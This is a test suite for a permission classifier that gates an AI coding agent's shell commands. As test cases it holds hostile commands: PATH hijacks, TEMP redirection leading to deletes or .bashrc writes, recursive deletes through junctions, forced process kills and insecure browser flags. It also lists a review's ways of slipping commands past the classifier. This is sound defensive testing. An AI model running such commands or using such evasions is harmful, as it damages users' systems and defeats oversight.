// Plan v3, Track A (decision 66): the hub settles the clearly harmless shapes itself. One block per rule, each with the
// plan's bad cases aimed at the path the rule opens. The principle: what the hub cannot read goes to judgment (unsure),
// never straight to allow; a hard stop stays human. Junctions are real ones, made in a throwaway folder.
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdirSync, writeFileSync, symlinkSync, existsSync, lstatSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import { makeTmp } from './helpers/tmp.mjs';
import { createServer } from 'node:net';
import { classify, LIVE_PORTS, portListening, listeningIn } from '../lib/permission-rules.mjs';
import { linkWorktree, unlinkWorktree } from '../tools/worktree-setup.mjs';

const root = makeTmp('crux-track-a-');
const project = join(root, 'proj');
const tmp = join(root, 'tmp');
const home = join(root, 'home');
const fw = p => p.replace(/\\/g, '/');
const P = fw(project), T = fw(tmp);
const WT = `${P}/.claude/worktrees`;
mkdirSync(join(project, 'hub', 'node_modules', 'pkg'), { recursive: true });
writeFileSync(join(project, 'hub', 'node_modules', 'pkg', 'index.js'), 'x');
mkdirSync(join(project, 'hub', 'tools'), { recursive: true });
writeFileSync(join(project, 'hub', 'tools', 'worktree-setup.mjs'), '// the project\'s copy');
for (const w of ['w1', 'w2', 'w3']) mkdirSync(join(project, '.claude', 'worktrees', w, 'hub', 'tools'), { recursive: true });
writeFileSync(join(project, '.claude', 'worktrees', 'w1', 'hub', 'tools', 'worktree-setup.mjs'), '// a copy a worker can edit');
mkdirSync(tmp, { recursive: true });
mkdirSync(home, { recursive: true });
// w1 has the junction to the project's packages; w2 has a real node_modules; w3 has none
symlinkSync(join(project, 'hub', 'node_modules'), join(project, '.claude', 'worktrees', 'w1', 'hub', 'node_modules'), 'junction');
mkdirSync(join(project, '.claude', 'worktrees', 'w2', 'hub', 'node_modules', 'own'), { recursive: true });

const at = (tool, command, extra = {}) => classify({ tool, input: { command }, projectDir: project, tmp, home, agent: 'builder', ...extra });
const sh = (c, x) => at('Bash', c, x);
const ps = (c, x) => at('PowerShell', c, x);
const why = r => `${r.route}: ${[...r.reasons, ...r.unsure].join('; ')}`;
const is = (route, r, c) => assert.equal(r.route, route, `${c}\n  -> ${why(r)}`);
const allow = (c, tool = 'Bash', x) => is('allow', at(tool, c, x), c);
const unsure = (c, tool = 'Bash', x) => is('unsure', at(tool, c, x), c);
const human = (c, tool = 'Bash', x) => is('human', at(tool, c, x), c);
const notAllow = (c, tool = 'Bash', x) => assert.notEqual(at(tool, c, x).route, 'allow', c);
const DATA = `CRUX_HUB_DATA="${T}/hub/data" CRUX_HOME="${T}/hub/home"`;

// ---------- A7: test hubs ----------
test('A7: LIVE_PORTS holds both the live hub and its phone port', () => {
  assert.deepEqual([...LIVE_PORTS].sort(), [4747, 4748]);
});

test('A7: a test hub starts from the project or a worktree on another port, with both data folders in temp', () => {
  allow(`${DATA} node server.mjs --port 4791 --no-agents`);
  allow(`cd ${WT}/w3/hub && ${DATA} node server.mjs --port 4792`);
  allow(`cd ${P}/hub && ${DATA} npm start -- --port 4793`.replace('npm start --', 'node server.mjs'));
  allow(`export CRUX_HUB_DATA="${T}/a" CRUX_HOME="${T}/b"; node server.mjs --port 4794`);
  allow('$env:CRUX_HUB_DATA = "$env:TEMP\\a"; $env:CRUX_HOME = "$env:TEMP\\b"; node server.mjs --port 4795', 'PowerShell');
  // the hub is told which port this request starts
  assert.deepEqual(sh(`${DATA} node server.mjs --port 4791`).hubsStarted, [4791]);
});

test('A7 bad: the live ports, no port, a live data folder, a data folder not in temp', () => {
  for (const port of [4747, 4748]) human(`${DATA} node server.mjs --port ${port}`);
  human(`${DATA} node server.mjs`, 'Bash');                         // no port: it would be 4747
  human(`${DATA} node server.mjs --port 04748`.replace('04748', '0'));
  human(`${DATA} CRUX_HUB_PORT=4748 node server.mjs --port 4791`);   // the port by environment
  human(`${DATA} PORT=4747 node server.mjs --port 4791`);
  human('$env:PORT = 4748; node server.mjs --port 4791', 'PowerShell');
  const homeFw = fw(home);
  human(`CRUX_HUB_DATA=${homeFw}/.crux-hub CRUX_HOME="${T}/b" node server.mjs --port 4791`);   // the live hub's data
  human(`CRUX_HUB_DATA="${T}/a" CRUX_HOME=${homeFw}/crux node server.mjs --port 4791`);        // the live profile
  // a hub with no CRUX_HOME (the profile) or no data folder, or folders in the project, is for judgment
  unsure(`CRUX_HUB_DATA="${T}/a" node server.mjs --port 4791`);
  unsure(`CRUX_HOME="${T}/b" node server.mjs --port 4791`);
  unsure('node server.mjs --port 4791');
  unsure(`CRUX_HUB_DATA="${P}/data" CRUX_HOME="${T}/b" node server.mjs --port 4791`);
  unsure(`CRUX_HUB_DATA="${T}/a" CRUX_HOME="${P}/home" node server.mjs --port 4791`);
  // a value only known at run time
  unsure(`CRUX_HUB_DATA="$X" CRUX_HOME="${T}/b" node server.mjs --port 4791`);
  assert.deepEqual(sh(`${DATA} node server.mjs --port 4748`).hubsStarted, [], 'a refused start tracks nothing');
});

test('A7: pinging a test hub is a read; typing or submitting a key, token or password stays a doubt', () => {
  allow('curl -s localhost:4791/api/ping');
  allow('curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:4791/');
  allow('Invoke-RestMethod http://127.0.0.1:4791/api/ping', 'PowerShell');
  allow('curl -s -X POST -H "content-type: application/json" -H "origin: http://localhost:4791" -d \'{"project":"p"}\' localhost:4791/api/settings');
  for (const body of ['{"apiKey":"sk-123"}', '{"token":"abc"}', '{"password":"x"}', '{"key":"k"}', '{"secret":"s"}', '{"vapid":"v"}', '{"passkey":"pk"}']) {
    unsure(`curl -s -X POST -H "origin: http://localhost:4791" -d '${body}' localhost:4791/api/settings`);
  }
  unsure('curl -s -H "Authorization: Bearer abc" localhost:4791/api/state');
  unsure('Invoke-RestMethod http://127.0.0.1:4791/api/x -Method Post -Body \'{"token":"t"}\' -ContentType application/json', 'PowerShell');
  // the live hub is never touched by a change
  human('curl -s -X POST -d \'{}\' localhost:4748/api/settings');
  human('curl -s -X POST -d \'{}\' localhost:4747/api/settings');
});

test('A7: headless Edge or Chrome, with a profile in temp and no debugging port', () => {
  const edge = '"/c/Program Files (x86)/Microsoft/Edge/Application/msedge.exe"';
  const good = `${edge} --headless=new --disable-gpu --user-data-dir="${T}/prof" --window-size=1280,720 --screenshot="${T}/a.png" "http://localhost:4791/"`;
  allow(good);
  allow(good.replace('msedge.exe', 'chrome.exe'));
  for (const bad of [
    good + ' --remote-debugging-port=9222', good + ' --remote-debugging-pipe', good + ' --remote-allow-origins=*', good + ' --load-extension=C:/x',
    good + ' --disable-web-security', good + ' --no-sandbox',
    good.replace(` --user-data-dir="${T}/prof"`, ''),                                  // no profile of its own: the user's own
    good.replace(`${T}/prof`, `${P}/prof`),                                            // a profile in the project, not temp
    good.replace('--headless=new', '--start-maximized'),                               // not headless
  ]) unsure(bad);
  human(good.replace(`${T}/prof`, `${fw(home)}/AppData/Local/Microsoft/Edge/User Data`));   // the user's real profile: a write outside
  human(good.replace(`${T}/a.png`, 'C:/Windows/a.png'));
  human(good.replace('http://localhost:4791/', 'https://example.com/'));                    // the network
});

test('A7: restart.mjs stops whatever listens on its port first: only a port this agent started, or one where nothing listens', async () => {
  const free = () => new Promise(r => { const s = createServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });
  const quiet = await free();
  const busy = await free();
  const sock = createServer(); await new Promise(r => sock.listen(busy, '127.0.0.1', r));   // somebody else's process on a test port
  try {
    assert.equal(portListening(busy), true);
    assert.equal(portListening(quiet), false);
    // nothing listens: it is only a start
    allow(`node hub/restart.mjs --port ${quiet} --no-open`);
    assert.deepEqual(sh(`node hub/restart.mjs --port ${quiet} --no-open`).hubsStarted, [quiet]);
    // something else listens, and this agent never started a hub there: for judgment
    unsure(`node hub/restart.mjs --port ${busy} --no-open`);
    unsure(`cd ${P}/hub && node restart.mjs --port ${busy}`);
    assert.deepEqual(sh(`node hub/restart.mjs --port ${busy}`).hubsStarted, [busy], 'still noted: the request is not refused, only judged');
    // a port this agent started a hub on is its own to restart
    allow(`node hub/restart.mjs --port ${busy} --no-open`, 'Bash', { hubs: [busy] });
    // the live ports, and no port (it would restart the live hub), stay stops
    for (const p of [4747, 4748]) human(`node hub/restart.mjs --port ${p}`, 'Bash', { hubs: [p] });
    human('node hub/restart.mjs');
  } finally { await new Promise(r => sock.close(r)); }
});

test('A7: stopping only a hub this agent started, never "whatever listens on the port"', () => {
  const started = { hubs: [4791] };
  allow('node hub/tools/stop-test-hub.mjs 4791', 'Bash', started);
  allow('Get-NetTCPConnection -LocalPort 4791 | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }', 'PowerShell', started);
  // killing by port without having started it, another port, the live ports
  unsure('node hub/tools/stop-test-hub.mjs 4791');
  unsure('node hub/tools/stop-test-hub.mjs 4792', 'Bash', started);
  unsure('Get-NetTCPConnection -LocalPort 4791 | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }', 'PowerShell');
  unsure('Get-NetTCPConnection -LocalPort 4792 | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }', 'PowerShell', started);
  for (const p of [4747, 4748]) {
    human(`node hub/tools/stop-test-hub.mjs ${p}`, 'Bash', { hubs: [p] });
    human(`Get-NetTCPConnection -LocalPort ${p} | ForEach-Object { Stop-Process -Id $_.OwningProcess }`, 'PowerShell', { hubs: [p] });
  }
  human('taskkill /PID 1234 /F', 'Bash', started);
  human('Stop-Process -Name node -Force', 'PowerShell', started);
  human('pkill -f server.mjs', 'Bash', started);
  // round 1 HIGH 4: a start and a stop in one command: the start does not vouch for the stop
  unsure(`${DATA} node server.mjs --port 4796 --no-agents & sleep 1; node hub/tools/stop-test-hub.mjs 4796`);
});

test('round 1 HIGH 4: a tracked port vouches only for a stop aimed at that port alone', () => {
  const started = { hubs: [4791] };
  const byPort = 'Get-NetTCPConnection -LocalPort 4791 | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }';
  allow(byPort, 'PowerShell', started);
  // another way of picking processes in the same command: judged by itself, whatever ports appear
  for (const c of [
    `${byPort}; Get-Process -Name node | Stop-Process -Force`,
    `${byPort}; Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*phone*' } | ForEach-Object { $_.Terminate() }`,
    `Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*4791*' } | ForEach-Object { Stop-Process -Id $_.ProcessId }  # port 4791`,
    `Get-NetTCPConnection -LocalPort 4791 | ForEach-Object { Stop-Process -Id $_.OwningProcess }; Get-Process | Where-Object { $_.Id -eq 99 } | Stop-Process`,
    'Get-NetTCPConnection -LocalPort 4791 | ForEach-Object { taskkill /PID $_.OwningProcess /F }',
    `Get-NetTCPConnection -LocalPort 4791 | ForEach-Object { Stop-Process -Id $_.OwningProcess }; Get-CimInstance Win32_Process -Filter "Name='node.exe'" | ForEach-Object { Stop-Process -Id $_.ProcessId }`,
  ]) notAllow(c, 'PowerShell', started);
  notAllow('taskkill /PID 4791 /F', 'Bash', started);
  notAllow('taskkill /IM node.exe /F # 4791', 'Bash', started);
  notAllow('Stop-Process -Name node # 4791', 'PowerShell', started);
  // an inline script: only the one stop shape, on a started port; a number in a comment, a PID or process.kill vouch for nothing
  const shape = p => `import('./hub/lib/relaunch.mjs').then(async m => { for (const p of await m.pidsOnPort(${p})) await m.stopTree(p) })`;
  allow(`node -e "${shape(4791)}"`, 'Bash', started);
  unsure(`node -e "${shape(4792)}"`, 'Bash', started);
  unsure(`node -e "// 4791\nprocess.kill(1234)"`, 'Bash', started);
  unsure(`node -e "process.kill(4791)"`, 'Bash', started);
  unsure(`node -e "${shape(4791)}; process.kill(1234)"`, 'Bash', started);
  unsure(`node -e "${shape(4791)}; await m.stopTree(1234)"`, 'Bash', started);
  notAllow(`node -e "/* 4791 */ require('child_process').execSync('taskkill /IM node.exe')"`, 'Bash', started);
  human(`node -e "${shape(4747)}"`, 'Bash', { hubs: [4747] });
});

test('round 1 HIGH 1: a command that gives TEMP, TMP or TMPDIR a value of its own has no temp folder to speak of', () => {
  const real = fw(home);
  // the review's three commands
  human(`$env:TEMP = "${real}\\x"; $t = [IO.Path]::GetTempPath(); Remove-Item -Recurse -Force "$t\\Documents"`, 'PowerShell');
  notAllow(`$env:TMP = "${real}\\x"; Set-Content "$([IO.Path]::GetTempPath())evil.txt" 1`, 'PowerShell');
  notAllow(`export TEMP=${real}; echo "alias git='x'" > "$(node -p "require('os').tmpdir()")/.bashrc"`);
  // every way of setting it, and every way of reaching it afterwards
  for (const c of [
    `$env:TEMP = "${real}"; Set-Content "$env:TEMP\\a.txt" 1`, `$env:tmp = "${real}"; Set-Content "$env:TEMP\\a.txt" 1`, `Set-Item env:TEMP "${real}"; Set-Content "$env:TEMP\\a.txt" 1`,
    `[Environment]::SetEnvironmentVariable("TEMP", "${real}"); Set-Content "$env:TEMP\\a.txt" 1`, `[Environment]::SetEnvironmentVariable('TMP', '${real}', 'Process'); Set-Content "$env:TMP\\a.txt" 1`,
  ]) human(c, 'PowerShell');
  for (const c of [
    `TEMP=${real} node -e 1; echo x > "$TEMP/a"`, `export TMP=${real}; echo x > /tmp/a`, `TMPDIR=${real}; echo x > /tmp/a`, `printf -v TMPDIR '%s' ${real}; echo x > /tmp/a`, `for TMP in ${real}; do echo x > /tmp/a; done`,
    `declare -x TEMP=${real}; echo x > /tmp/a`, `read TMP <<< ${real}; echo x > /tmp/a`, `env TEMP=${real} sh -c 'echo x > /tmp/a'`, `set TEMP=${real} && echo x > /tmp/a`,
    `export TEMP=${real}; T=$(mktemp -d); echo x > "$T/a"; rm -rf "$T"`,
  ]) notAllow(c);
  // New-Item -Force on a folder that is already there does not make it this agent's own
  mkdirSync(join(tmp, 'existing', 'keep'), { recursive: true });
  unsure('New-Item -ItemType Directory -Force "$env:TEMP\\existing" | Out-Null; Remove-Item -Recurse -Force "$env:TEMP\\existing"', 'PowerShell');
  unsure(`mkdir -p ${T}/existing && rm -rf ${T}/existing`);
  allow('New-Item -ItemType Directory -Force "$env:TEMP\\fresh-one" | Out-Null; Remove-Item -Recurse -Force "$env:TEMP\\fresh-one"', 'PowerShell');   // one it makes itself
  // and nothing changed for a command that leaves TEMP alone
  allow('Set-Content "$env:TEMP\\ok.txt" 1', 'PowerShell');
  allow('echo hi > /tmp/ok.txt');
  allow('Set-Content -Path:"$env:TEMP\\ok.txt" -Value x', 'PowerShell');
});

test('round 1 HIGH 2: a .Delete() goes only to the Get-Item it is written on', () => {
  const j = `${WT}/w1/hub/node_modules`.replace(/\//g, '\\'), real = `${WT}/w2/hub/node_modules`.replace(/\//g, '\\');
  allow(`(Get-Item "${j}").Delete()`, 'PowerShell');
  allow(`$i = Get-Item "${j}" -Force; $i.Delete()`, 'PowerShell');
  allow(`$i = Get-Item -LiteralPath "${j}"; if ($i.LinkType -eq 'Junction') { $i.Delete() }`, 'PowerShell');
  for (const c of [
    `Get-Item "${j}" | Out-Null; (Get-ChildItem "${real}").Delete()`,
    `(Get-Item "${j}"); (Get-ChildItem "${WT.replace(/\//g, '\\')}\\w2").Delete()`,
    `$j = Get-Item "${j}"; (Get-ChildItem "${WT.replace(/\//g, '\\')}\\w2\\hub" | Select-Object -First 1).Delete()`,
    `(Get-Item "${j}", "${real}").Delete()`,
    `$i = Get-Item "${j}"; $i = Get-Item "${real}"; $i.Delete()`,                                // set twice
    `$i = Get-Item "${j}"; foreach ($i in Get-ChildItem "${real}") { $i.Delete() }`,             // a loop variable too
    `$i = Get-Item "${j}"; $i.Delete($true)`,                                                      // recursive
    `$k = Get-Item "${j}"; $i.Delete()`,                                                           // another variable
    `$i = Get-ChildItem "${real}"; $i.Delete()`,
    `(Get-Item "${real}").Delete()`,                                                               // a real folder, not a junction
  ]) notAllow(c, 'PowerShell');
});

test('round 1 HIGH 3: $(( )) holds literal numbers only; a name or value inside can run a command (array subscript)', () => {
  allow('echo $((1 + 2 * 3))');
  allow('echo "total $(( (4 + 5) % 3 ))"');
  for (const c of [
    'y=$(cat hub/package.json); echo $((y))', 'for y in $(ls hub); do echo $((y)); done', 'n=$((n+1)); echo $n', 'echo $(( $(cat hub/package.json) + 1 ))',
    'a=1; echo $((a))', 'echo $((x[0]))', 'echo $(( ${y} ))', 'y=$(cat hub/package.json); [[ "$y" -eq 1 ]] && echo yes', 'y=$(cat hub/package.json); (( y > 1 )) && echo yes',
  ]) notAllow(c);
});

test('round 1 MEDIUM 5: a test hub counts as this agent\'s only once the request is allowed (see permission-routing.test.mjs)', () => {
  assert.deepEqual(sh(`${DATA} node server.mjs --port 4791`).hubsStarted, [4791], 'classify reports it; the hub notes it after the allow');
});

test('round 1 MEDIUM 6: find -delete through a junction is a doubt, like rm', () => {
  const j = `${WT}/w1/hub/node_modules`;
  for (const c of [
    `find ${j} -delete`, `find ${j}/ -delete`, `find -L ${WT}/w1/hub -delete`, `find -H ${j} -type f -delete`, `find ${WT}/w1/hub -follow -delete`, `find ${WT}/w1/hub -name pkg -delete`,
    `cd ${j} && find . -delete`, `find ${WT}/w1 -delete`, `find -P ${j}/pkg -delete`,
  ]) unsure(c);
  allow(`find ${WT}/w2/hub/node_modules -name own -delete`);
  allow(`find ${P}/hub/tools -name '*.tmp' -delete`);
  notAllow(`find ${j} -exec rm -rf {} +`);
});

test('round 1 MEDIUM 7: worktree-setup.mjs link makes a junction the rest of the command cannot delete through', () => {
  const setup = `node ${P}/hub/tools/worktree-setup.mjs link ${WT}/w3`;
  allow(setup);
  for (const after of [`rm -rf ${WT}/w3/hub/node_modules/*`, `rm -rf ${WT}/w3/hub/node_modules/pkg`, `rm -rf ${WT}/w3/hub/node_modules`, `rm -rf ${WT}/w3/hub`]) {
    notAllow(`${setup} && ${after}`);
  }
  allow(`rm -rf ${WT}/w3/hub/node_modules/pkg`);   // nothing there yet: an ordinary delete
});

test('round 1 LOW: an unknown value that could be several words or options is a doubt', () => {
  for (const c of ['head -n $(cat hub/package.json) hub/x', 'tail -n "$(cat hub/package.json)" hub/x', 'head -c $(wc -c < hub/package.json) hub/package.json', 'date -d $(echo x)', 'wc -l $(ls hub)', 'cat -n "$(echo hub/package.json)"',
    'grep "$(echo x)" hub/package.json', 'grep -f "$(echo x)" hub/package.json', 'grep -c "$(echo needle)" hub/package.json', 'ls $(echo -la)', 'sort $(echo -o) a']) unsure(c);
  allow('grep -c -e "$(echo needle)" hub/package.json');
  allow('grep -c -- "$(echo needle)" hub/package.json');
  allow('echo "$(date)"');
  allow('test -f "$(git rev-parse --show-toplevel)/hub/package.json" && echo yes');
});

test('round 1 LOW: the PATH rule', () => {
  allow('$env:Path = "$env:USERPROFILE\\.cargo\\bin;$env:Path"', 'PowerShell');
  allow('PATH="$HOME/.cargo/bin:$PATH"; ls');
  allow('PATH=$HOME/.cargo/bin:$PATH ls');
  for (const c of [
    // HOME and USERPROFILE are not what they were
    '$env:USERPROFILE = "C:\\evil"; $env:Path = "$env:USERPROFILE\\.cargo\\bin;$env:Path"', '$env:USERPROFILE = "C:\\evil"\n$env:Path = "$env:USERPROFILE\\.cargo\\bin;$env:Path"',
    'export HOME=/tmp/x; PATH="$HOME/.cargo/bin:$PATH"; ls', 'HOME=/tmp/x PATH="$HOME/.cargo/bin:$PATH" ls', 'HOME=/tmp/x; PATH=$HOME/.cargo/bin:$PATH git status',
    // relative folders
    '$env:Path = "HOME\\.cargo\\bin;$env:Path"', '$env:Path = ".cargo\\bin;$env:Path"', 'PATH="HOME/.cargo/bin:$PATH"; ls', 'PATH=.cargo/bin:$PATH git status',
    // the prefix form and the other ways to give PATH a value
    'PATH=/tmp/evil:$PATH git status', 'PATH=/tmp/evil git status', 'printf -v PATH "%s" /tmp/evil; git status', 'read PATH <<< /tmp/evil; git status', 'declare PATH=/tmp/evil:$PATH; git status',
    'for PATH in /tmp/evil; do git status; done', 'typeset -x PATH=/tmp/evil; git status', 'local PATH=/tmp/evil', 'export PATH=/tmp/evil:$PATH',
  ]) notAllow(c);
  for (const c of ['Set-Item env:Path C:\\evil', "[Environment]::SetEnvironmentVariable('Path', 'C:\\evil')", '$env:Path += ";C:\\evil"', 'Set-Item -Path env:PATH -Value C:\\evil', 'New-Item env:Path -Value x -Force', 'Set-Content env:PATH C:\\evil']) notAllow(c, 'PowerShell');
  // a read of PATH, or a file named PATH, is no change
  allow('echo "$PATH" | head -1');
  allow('Write-Host $env:Path', 'PowerShell');
  allow('Set-Content -Path:hub\\b.txt -Value x', 'PowerShell');
  allow('ls hub/PATH.txt');
});

test('round 1 LOW: portListening reads the columns, not the word for the state', () => {
  const de = 'Aktive Verbindungen\r\n\r\n  Proto  Lokale Adresse         Remoteadresse          Status\r\n  TCP    0.0.0.0:4791           0.0.0.0:0              ABHÖREN\r\n  TCP    127.0.0.1:50000        127.0.0.1:4799         HERGESTELLT\r\n  TCP    [::]:4800              [::]:0                 ABHÖREN\r\n';
  assert.equal(listeningIn(de, 4791), true);
  assert.equal(listeningIn(de, 4800), true, 'IPv6');
  assert.equal(listeningIn(de, 50000), false, 'a client port is not listening');
  assert.equal(listeningIn(de, 4799), false, 'the far end of a connection is not this machine listening');
  assert.equal(listeningIn(de, 4792), false);
  const linux = 'Active Internet connections\ntcp        0      0 0.0.0.0:4791          0.0.0.0:*             LISTEN\ntcp        0      0 10.0.0.1:22           10.0.0.2:5555         ESTABLISHED\n';
  assert.equal(listeningIn(linux, 4791), true);
  assert.equal(listeningIn(linux, 22), false);
  assert.equal(listeningIn('', 4791), true, 'nothing it can read: listening');
  assert.equal(listeningIn('Zugriff verweigert', 4791), true);
});

// ---------- A8: junctions ----------
test('A8: the project\'s own worktree-setup.mjs, by its full path, for a worktree under .claude/worktrees', () => {
  allow(`node ${P}/hub/tools/worktree-setup.mjs link ${WT}/w3`);
  allow(`node ${P}/hub/tools/worktree-setup.mjs unlink ${WT}/w3`);
  allow(`cd ${P} && node hub/tools/worktree-setup.mjs link .claude/worktrees/w3`);
  allow(`node ${P}/hub/tools/worktree-setup.mjs unlink "${WT}/w1"`);
});

test('A8 bad: a worktree\'s copy of the script, other words, other folders', () => {
  // a worktree's copy can be edited by the worker: never allowed by name
  unsure(`node ${WT}/w1/hub/tools/worktree-setup.mjs link ${WT}/w3`);
  unsure(`cd ${WT}/w1 && node hub/tools/worktree-setup.mjs link ${WT}/w3`);   // relative: that is the worktree's copy
  unsure(`node ${WT}/w3/hub/tools/worktree-setup.mjs unlink ${WT}/w3`);
  for (const bad of [
    `link ${P}`, `link ${WT}`, `link ${T}/x`, `link ${fw(home)}/x`, `link ${WT}/w3/hub`, `link ${WT}/w3 ${WT}/w2`, `delete ${WT}/w3`, `link`, 'link $W', `link ${WT}/*`,
    `link ${P}/../elsewhere`, 'link C:/Windows',
  ]) unsure(`node ${P}/hub/tools/worktree-setup.mjs ${bad}`);
  // another project's copy, by name
  unsure('node C:/Users/someone/Documents/GitHub/other/hub/tools/worktree-setup.mjs link C:/Users/someone/Documents/GitHub/other/.claude/worktrees/x');
  // a script with the same name elsewhere in the project
  unsure(`node ${P}/scripts/worktree-setup.mjs link ${WT}/w3`);
});

test('A8: removing a junction is rmdir or Delete() of the junction itself', () => {
  allow(`rmdir ${WT}/w1/hub/node_modules`);
  allow(`cmd /c rmdir "${WT}/w1/hub/node_modules"`);
  const j = `${WT}/w1/hub/node_modules`.replace(/\//g, '\\');
  allow(`(Get-Item "${j}").Delete()`, 'PowerShell');
  allow(`$l = "${j}"; if ((Test-Path $l) -and ((Get-Item $l -Force).LinkType -eq 'Junction')) { (Get-Item $l -Force).Delete(); "unlinked" }`, 'PowerShell');
  allow(`[IO.Directory]::Delete("${j}")`, 'PowerShell');
  allow(`[System.IO.Directory]::Delete('${j}')`, 'PowerShell');
  // no junction there (to the hub that cannot be told from a typo): for judgment
  unsure(`(Get-Item "${WT}/w3/hub/node_modules").Delete()`, 'PowerShell');
});

test('A8 bad: a recursive delete through a junction stays a doubt, whatever way it is written', () => {
  const j = `${WT}/w1/hub/node_modules`;
  const jw = j.replace(/\//g, '\\');
  for (const c of [
    `rm -rf ${j}`, `rm -r ${j}`, `rm -rf ${j}/pkg`, `rm -rf "${j}/"*`, `rm -rf ${WT}/w1/hub`, `rm -rf ${WT}/w1`, `rimraf ${j}`, `cd ${WT}/w1/hub && rm -rf node_modules`,
    `rmdir /s /q "${jw}"`, `cmd /c rmdir /s /q "${jw}"`,
  ]) notAllow(c);
  for (const c of [`Remove-Item -Recurse -Force "${jw}"`, `Remove-Item -Recurse "${jw}\\pkg"`, `Remove-Item -Force -Recurse -LiteralPath "${jw}"`, `ri -r -fo "${jw}"`,
    `Remove-Item -Recurse -Force "${WT.replace(/\//g, '\\')}\\w1"`, `Remove-Item "${jw}" -Recurse:$true`]) is('unsure', ps(c), c);
  // the hub folder of the worktree holds the junction: deleting it recursively goes through it
  is('unsure', sh(`rm -rf ${WT}/w1/hub`), 'a folder that holds a junction');
  // an inline script
  is('unsure', sh(`node -e "require('fs').rmSync('${j}', { recursive: true })"`), 'rmSync through the link');
  // a real folder in a worktree is an ordinary delete
  allow(`rm -rf ${WT}/w2/hub/node_modules`);
  allow(`Remove-Item -Recurse -Force "${WT.replace(/\//g, '\\')}\\w2\\hub\\node_modules"`, 'PowerShell');
  // Delete() of something that is not a link, and of a path with a second argument (recursive)
  unsure(`(Get-Item "${WT}/w2/hub/node_modules").Delete()`, 'PowerShell');
  unsure(`[IO.Directory]::Delete("${jw}", $true)`, 'PowerShell');
  unsure(`[IO.Directory]::Delete("${WT}/w2/hub/node_modules")`, 'PowerShell');
  // a delete outside is still a stop
  human('(Get-Item "C:\\Windows\\x").Delete()', 'PowerShell');
  // a junction made in this very command, then deleted through
  notAllow(`cmd /c mklink /J ${WT}/w3/hub/node_modules ${P}/hub/node_modules && rm -rf ${WT}/w3/hub/node_modules`);
});

test('A8: an install in a worktree with a junction is an install into the main project', () => {
  for (const level of ['auto', 'trusted']) {
    for (const c of [`cd ${WT}/w1/hub && npm install zod`, `cd ${WT}/w1/hub && npm ci`, `npm install --prefix ${WT}/w1/hub zod`, `cd ${WT}/w1/hub && pnpm add zod`]) {
      human(c, 'Bash', { level });
    }
  }
  // a worktree with no junction: only Trusted lets it install into its own folder (a real node_modules), never through a link
  allow(`cd ${WT}/w2/hub && npm install zod`, 'Bash', { level: 'trusted' });
  allow(`cd ${WT}/w3/hub && npm ci`, 'Bash', { level: 'trusted' });
  human(`cd ${WT}/w2/hub && npm install zod`, 'Bash', { level: 'auto' });
});

test('worktree-setup.mjs: links, unlinks and refuses what it should', () => {
  const proj = join(root, 'setup-proj');
  mkdirSync(join(proj, 'hub', 'node_modules', 'zod'), { recursive: true });
  for (const w of ['a', 'b', 'c']) mkdirSync(join(proj, '.claude', 'worktrees', w, 'hub'), { recursive: true });
  mkdirSync(join(proj, '.claude', 'worktrees', 'b', 'hub', 'node_modules'));   // a real folder
  const a = join(proj, '.claude', 'worktrees', 'a');
  assert.equal(linkWorktree(proj, a).ok, true);
  assert.ok(lstatSync(join(a, 'hub', 'node_modules')).isSymbolicLink());
  assert.ok(existsSync(join(a, 'hub', 'node_modules', 'zod')), 'the junction reaches the project\'s packages');
  assert.match(linkWorktree(proj, a).message, /Already linked/);
  // never replaces a real folder
  const b = join(proj, '.claude', 'worktrees', 'b');
  assert.equal(linkWorktree(proj, b).ok, false);
  assert.equal(unlinkWorktree(proj, b).ok, false, 'a real folder is not removed');
  assert.ok(existsSync(join(b, 'hub', 'node_modules')));
  // refuses a folder that is not directly under .claude/worktrees, the project itself, and nothing
  for (const bad of [proj, join(proj, '.claude', 'worktrees'), join(proj, 'hub'), join(proj, '.claude', 'worktrees', 'a', 'hub'), root, join(proj, '.claude', 'worktrees', 'zzz'), '', undefined]) {
    assert.equal(linkWorktree(proj, bad).ok, false, String(bad));
    assert.equal(unlinkWorktree(proj, bad).ok, false, String(bad));
  }
  // unlink removes the link and nothing it points to
  const r = unlinkWorktree(proj, a);
  assert.equal(r.ok, true, r.message);
  assert.ok(!existsSync(join(a, 'hub', 'node_modules')), 'the link is gone');
  assert.ok(existsSync(join(proj, 'hub', 'node_modules', 'zod')), 'the project\'s packages are untouched');
  assert.match(unlinkWorktree(proj, a).message, /No link/);
  // a link that points somewhere else is left alone
  const elsewhere = join(root, 'elsewhere'); mkdirSync(elsewhere);
  const c = join(proj, '.claude', 'worktrees', 'c');
  symlinkSync(elsewhere, join(c, 'hub', 'node_modules'), 'junction');
  assert.equal(unlinkWorktree(proj, c).ok, false);
  assert.ok(lstatSync(join(c, 'hub', 'node_modules')).isSymbolicLink());
  // no packages of the project's own to link to
  const bare = join(root, 'bare-proj'); mkdirSync(join(bare, '.claude', 'worktrees', 'x', 'hub'), { recursive: true });
  assert.equal(linkWorktree(bare, join(bare, '.claude', 'worktrees', 'x')).ok, false);
  // a copy of the script inside a worktree refuses to act as the project
  const inWt = join(proj, '.claude', 'worktrees', 'a');
  assert.equal(linkWorktree(inWt, join(inWt, '.claude', 'worktrees', 'x')).ok, false);
  assert.deepEqual(readdirSync(join(proj, 'hub', 'node_modules')), ['zod']);
});

// ---------- A1: read-only command substitution as an unknown value ----------
test('A1: a $( ) of read-only commands is an unknown value, fine where it is only text, a test or a pattern', () => {
  allow('echo "tracked: $(git ls-files | wc -l)"');
  allow('echo $(date)');
  allow('echo "branch: $(git branch --show-current) at $(git rev-parse --short HEAD)"');
  allow('n=$(wc -l < hub/package.json); echo "lines: $n"');
  allow('echo "files: $(ls hub | head -3)"');
  allow(`grep -c -e "$(echo needle)" hub/package.json`);
  allow('test -f "$(git rev-parse --show-toplevel)/hub/package.json" && echo yes');
  allow('[ "$(git status --short | wc -l)" = "0" ] && echo clean');
  allow('for d in $(ls hub); do echo "== $d"; done');
